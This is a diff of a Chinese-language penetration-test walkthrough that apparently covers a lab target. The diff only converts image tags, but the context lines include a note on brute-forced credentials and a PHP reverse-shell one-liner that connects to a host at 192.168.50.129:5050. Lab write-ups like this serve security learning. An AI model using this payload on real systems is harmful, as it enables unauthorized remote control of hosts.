@@ -67,7 +67,7 @@
 
 尝试访问爆破出来的信息，注意要添加代理。
 
-<img src="./assets/image-20240607230124144.png" alt="image-20240607230124144" style="zoom:50%;" />
+![image-20240607230124144](./assets/image-20240607230124144.png)
 
 ![image-20240607231856894](./assets/image-20240607231856894.png)
 
@@ -134,9 +134,9 @@ admin
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.50.129/5050 0>&1'"); ?>
 ```
 
-<img src="./assets/image-20240609011319770.png" alt="image-20240609011319770" style="zoom: 67%;" />
+![image-20240609011319770](./assets/image-20240609011319770.png)
 
-<img src="./assets/image-20240609011834199.png" alt="image-20240609011834199" style="zoom:67%;" />
+![image-20240609011834199](./assets/image-20240609011834199.png)
 
 ![image-20240609011731192](./assets/image-20240609011731192.png)
 
